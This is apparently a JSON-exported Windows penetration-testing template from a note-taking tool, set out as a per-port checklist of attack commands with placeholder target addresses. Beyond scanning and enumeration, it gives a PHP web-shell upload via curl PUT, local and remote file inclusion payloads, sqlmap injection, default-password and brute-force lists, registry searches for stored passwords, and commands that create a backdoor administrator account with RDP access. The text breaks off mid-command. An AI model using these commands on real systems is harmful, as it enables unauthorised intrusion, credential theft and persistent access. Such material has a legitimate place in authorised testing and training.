{"targets":[],"libraries":[],"templates":[{"id":"8bd36535-e82f-474f-8300-aa37583ffc5e","title":"Windows","content":"<p><strong style=\"font-size: 36px; color: rgb(240, 102, 102); font-family: martel-sans;\">Windows</strong><strong style=\"font-size: 36px; color: rgb(68, 68, 68); font-family: martel-sans;\"> Template</strong></p><p><br></p><p><strong style=\"font-size: 24px; color: rgb(68, 68, 68); font-family: martel-sans;\">Info Sheet</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">DNS-Domain name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Host name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">OS:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Server:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Kernel:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Workgroup:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Domain:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">IP: </span></li></ul><p><br></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Services and ports: </span></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTTCPSCAN\n</pre><p><br></p><p><span style=\"font-size: 24px; color: rgb(68, 68, 68); font-family: martel-sans;\">Recon</span></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Always start with a stealthy scan to avoid closing ports.</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Syn-scan</span>\nnmap -sS INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Scan all ports, might take a while.</span>\nnmap INSERTIPADDRESS -p-\n\n<span class=\"hljs-comment\"># Service-version, default scripts, OS:</span>\nnmap INSERTIPADDRESS -sV -sC -O -p <span class=\"hljs-number\">111</span>,<span class=\"hljs-number\">222</span>,<span class=\"hljs-number\">333</span>\n\n<span class=\"hljs-comment\"># Scan for UDP</span>\nnmap INSERTIPADDRESS -sU\nunicornscan -mU -v -I INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Connect to udp if one is open</span>\nnc -u INSERTIPADDRESS <span class=\"hljs-number\">48772</span>\n\n<span class=\"hljs-comment\"># Monster scan</span>\nnmap INSERTIPADDRESS -p- -A -T4 -sC\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 21 - FTP</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">FTP-Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">FTP-version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Anonymous login:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTFTPTEST\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 22 - SSH</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Takes-password:</span></li></ul><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">If you have usernames test login with username:username</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTSSHCONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nc INSERTIPADDRESS 22\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 25</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">Name:\nVersion:\nVRFY:\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTSMTPCONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nc -nvv INSERTIPADDRESS 25\nHELO foo&lt;cr&gt;&lt;lf&gt;\n\ntelnet INSERTIPADDRESS 25\nVRFY root\n\nnmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 69 - UDP - TFTP</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">This is used for tftp-server.</span></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 110 - Pop3</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li></ul><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTPOP3CONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">telnet INSERTIPADDRESS <span class=\"hljs-number\">110</span>\nUSER pelle@INSERTIPADDRESS\nPASS admin\n\n<span class=\"hljs-symbol\">or:</span>\n\nUSER pelle\nPASS admin\n\n<span class=\"hljs-comment\"># List all emails</span>\nlist\n\n<span class=\"hljs-comment\"># Retrieve email number 5, for example</span>\nretr <span class=\"hljs-number\">9</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 111 - Rpcbind</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">rpcinfo -p INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 135 - MSRPC</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Some versions are vulnerable.</span></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 143 - Imap</strong></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 139/445 - SMB</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Domain/workgroup name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Domain-sid:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Allows unauthenticated login:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-<span class=\"hljs-number\">3103</span>.nse,smb-vuln-ms06-<span class=\"hljs-number\">025</span>.nse,smb-vuln-ms07-<span class=\"hljs-number\">02</span>9.nse,smb-vuln-ms08-<span class=\"hljs-number\">067</span>.nse,smb-vuln-ms1<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">054</span>.nse,smb-vuln-ms1<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">061</span>.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p <span class=\"hljs-number\">445</span>\n\n\nenum4linux -a INSERTIPADDRESS\nrpcclient -U <span class=\"hljs-string\">\"\"</span> INSERTIPADDRESS\n\tsrvinfo\n\tenumdomusers\n\tgetdompwinfo\n\tquerydominfo\n\tnetshareenum\n\tnetshareenumall\n\nsmbclient -L INSERTIPADDRESS\nsmbclient /<span class=\"hljs-regexp\">/INSERTIPADDRESS/tmp</span>\nsmbclient \\\\\\\\INSERTIPADDRESS\\\\ipc$ -U john\nsmbclient /<span class=\"hljs-regexp\">/INSERTIPADDRESS/ipc</span>$ -U john&nbsp;&nbsp;\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 161/162 UDP - SNMP</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS\nsnmp-check -t INSERTIPADDRESS -c public\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Common community strings</span>\npublic\nprivate\ncommunity\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 554 - RTSP</strong></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 1030/1032/1033/1038</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Used by RPC to connect in domain network.</span></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 1521 - Oracle</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Password protected:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">tnscmd10g version -h INSERTIPADDRESS\ntnscmd10g status -h INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 2049 - NFS</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">showmount -e INSERTIPADDRESS\n</pre><p><br></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">If you find anything you can mount it like this:</span></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">mount INSERTIPADDRESS:<span class=\"hljs-regexp\">/ /</span>tmp/NFS\nmount -t INSERTIPADDRESS:<span class=\"hljs-regexp\">/ /</span>tmp/NFS\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 2100 - Oracle XML DB</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Default logins:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">sys:sys\nscott:tiger\n</pre><p><br></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Default passwords https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</span></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">3306 - MySQL</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306\n\nmysql --host=INSERTIPADDRESS -u root -p\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 3339 - Oracle web interface</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Basic info about web service (apache, nginx, IIS)</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Server:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Scripting language:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Apache Modules:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">IP-address:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 80 - Web server</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Server:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Scripting language:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Apache Modules:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">IP-address:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Domain-name address:</span></li></ul><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTCURLHEADER\n</pre><p><br></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Web application (ex, wordpress, joomla, phpmyadmin)</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Name:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Version:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Admin-login:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Nikto</span>\nnikto -h http://INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Nikto with squid proxy</span>\nnikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:<span class=\"hljs-number\">4444</span>\n\n<span class=\"hljs-comment\"># Get header</span>\ncurl -i INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Get everything</span>\ncurl -i -L INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Check for title and all links</span>\ncurl INSERTIPADDRESS -s -L | grep <span class=\"hljs-string\">\"title\\|href\"</span> | sed -e <span class=\"hljs-string\">'s/^[[:space:]]*//'</span>\n\n<span class=\"hljs-comment\"># Look at page with just text</span>\ncurl INSERTIPADDRESS -s -L | html2text -width <span class=\"hljs-string\">'99'</span> | uniq\n\n<span class=\"hljs-comment\"># Check if it is possible to upload</span>\ncurl -v -X OPTIONS http://INSERTIPADDRESS/\ncurl -v -X PUT -d <span class=\"hljs-string\">'&lt;?php system($_GET[\"cmd\"]); ?&gt;'</span> http://INSERTIPADDRESS/test/shell.php\n\ndotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Nikto scan</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTNIKTOSCAN\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Url brute force</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Not recursive</span>\ndirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt\n\n<span class=\"hljs-comment\"># Gobuster - remove relevant responde codes (403 for example)</span>\ngobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s <span class=\"hljs-string\">'200,204,301,302,307,403,500'</span> -e\n\n\nINSERTDIRBSCAN\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Default/Weak login</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Search documentation for default passwords and test them</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">site:webapplication.com password\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">admin admin\nadmin password\nadmin &lt;blank&gt;\nadmin &lt;servicename&gt;\nroot root\nroot admin\nroot password\nroot &lt;servicename&gt;\n&lt;username if you have&gt; password\n&lt;username if you have&gt; admin\n&lt;username if you have&gt; username\nusername &lt;servicename&gt;\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">LFI/RFI</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">fimap -u <span class=\"hljs-string\">\"http://INSERTIPADDRESS/example.php?test=\"</span>\n\n<span class=\"hljs-comment\"># Ordered output</span>\ncurl -s <span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/gallery</span>.php?page=<span class=\"hljs-regexp\">/etc/passwd</span>\n/root/Tools/Kadimus/kadimus -u <span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/example</span>.php?page=\n\n<span class=\"hljs-comment\"># Bypass execution</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/index</span>.php?page=<span class=\"hljs-symbol\">php:</span>/<span class=\"hljs-regexp\">/filter/convert</span>.base64-encode/resource=index\nbase64 -d savefile.php\n\n<span class=\"hljs-comment\"># Bypass extension</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/page</span>=<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/192.168.1.101/maliciousfile</span>.txt%<span class=\"hljs-number\">00</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/page</span>=<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/192.168.1.101/maliciousfile</span>.txt?\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">SQL-Injection</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Post</span>\n./sqlmap.py -r search-test.txt -p tfUPass\n\n<span class=\"hljs-comment\"># Get</span>\nsqlmap -u <span class=\"hljs-string\">\"http://INSERTIPADDRESS/index.php?id=1\"</span> --dbms=mysql\n\n<span class=\"hljs-comment\"># Crawl</span>\nsqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=<span class=\"hljs-number\">3</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Sql-login-bypass</strong></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Open Burp-suite</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Make and intercept a request</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Send to intruder</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Cluster attack.</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Attack</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Check for response length variation</span></li></ul><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Password brute force - last resort</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">cewl\n</pre><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Port 443 - HTTPS</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Heartbleed:</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Heartbleed</span>\nsslscan <span class=\"hljs-symbol\">INSERTIPADDRESS:</span><span class=\"hljs-number\">443</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 24px; color: rgb(68, 68, 68); font-family: martel-sans;\">Vulnerability analysis</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.</span></p><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">To try - List of possibilies</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">Add possible exploits here:\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Find sploits - Searchsploit and google</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Where there are many exploits for a software, use google. It will automatically sort it by popularity.</span></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">site:exploit-db.com apache <span class=\"hljs-number\">2.4.7</span>\n\n<span class=\"hljs-comment\"># Remove dos-exploits</span>\n\nsearchsploit Apache <span class=\"hljs-number\">2.4.7</span> | grep -v <span class=\"hljs-string\">'/dos/'</span>\nsearchsploit Apache | grep -v <span class=\"hljs-string\">'/dos/'</span> | grep -vi <span class=\"hljs-string\">\"tomcat\"</span>\n\n<span class=\"hljs-comment\"># Only search the title (exclude the path), add the -t</span>\nsearchsploit -t Apache | grep -v <span class=\"hljs-string\">'/dos/'</span>\n</pre><p><br></p><p><br></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-string\">'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''</span>\n\n</pre><p><br></p><p><br></p><p><br></p><p><strong style=\"font-size: 24px; color: rgb(68, 68, 68); font-family: martel-sans;\">Privilege escalation</strong></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Now we start the whole enumeration-process over gain.</span></p><p><br></p><p><span style=\"color: rgb(68, 68, 68); font-family: martel-sans; font-size: 16px;\">Most likely</span></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Kernel exploits</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Programs running as root</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Installed software</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Weak/reused/plaintext passwords</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Inside service</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Suid misconfiguration</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">World writable scripts invoked by root</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Unmounted filesystems</span></li></ul><p><br></p><p><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Less likely</span></p><ul><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Private ssh keys</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Bad path configuration</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Cronjobs</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">To-try list</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\">#Here you will add all possible leads. What to try.</span>\n\n</pre><h1><br></h1><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Basic info</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">OS:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Architecture:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Current user:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Hotfixes:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Antivirus:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Users:</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Localgroups:</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">systeminfo\n<span class=\"hljs-keyword\">set</span>\nhostname\nnet users\nnet user user1\nnet localgroups\naccesschk.exe -uwcqv \"Authenticated Users\" *\n\nnetsh firewall show state\nnetsh firewall show config\n\n# Set path\n<span class=\"hljs-keyword\">set</span> PATH=%PATH%;C:\\xampp\\php\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Kernel exploits</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Look for hotfixes</span>\nsysteminfo\n\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n<span class=\"hljs-comment\"># Search for exploits</span>\n<span class=\"hljs-symbol\">site:</span>exploit-db.com windows XX XX\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Cleartext passwords</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Windows autologin</span>\nreg query <span class=\"hljs-string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"</span>\n\n<span class=\"hljs-comment\"># VNC</span>\nreg query <span class=\"hljs-string\">\"HKCU\\Software\\ORL\\WinVNC3\\Password\"</span>\n\n<span class=\"hljs-comment\"># SNMP Parameters</span>\nreg query <span class=\"hljs-string\">\"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"</span>\n\n<span class=\"hljs-comment\"># Putty</span>\nreg query <span class=\"hljs-string\">\"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"</span>\n\n<span class=\"hljs-comment\"># Search for password in registry</span>\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Reconfigure service parameters</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Unquoted service paths</span></li></ul><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check book for instructions</span></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Weak service permissions</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Inside service</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.</span></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Meterpreter</span>\nrun get_local_subnets\n\nnetstat /a\nnetstat -ano\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 20px;\">Programs running as system</strong></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Installed software</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Metasploit</span>\nps\n\ntasklist /SVC\nnet start\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\nDRIVERQUERY\n\nLook <span class=\"hljs-symbol\">in:</span>\n<span class=\"hljs-symbol\">C:</span>\\Program files\n<span class=\"hljs-symbol\">C:</span>\\Program files (x86)\nHome directory of the user\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Scheduled tasks</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">schtasks /query /fo LIST /v\n\nCheck <span class=\"hljs-keyword\">this</span> file:\nc:\\WINDOWS\\SchedLgU.Txt\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Weak passwords</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Remote desktop</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">ncrack -vv --user george -P /root/oscp/passwords.txt rdp:<span class=\"hljs-comment\">//INSERTIPADDRESS</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Useful commands</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Add user and enable RDP</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">net user haxxor Haxxor123 /add\nnet localgroup Administrators haxxor /add\nnet localgroup <span class=\"hljs-string\">\"Remote Desktop Users\"</span> haxxor /ADD\n\n<span class=\"hljs-comment\"># Enable RDP</span>\nreg add <span 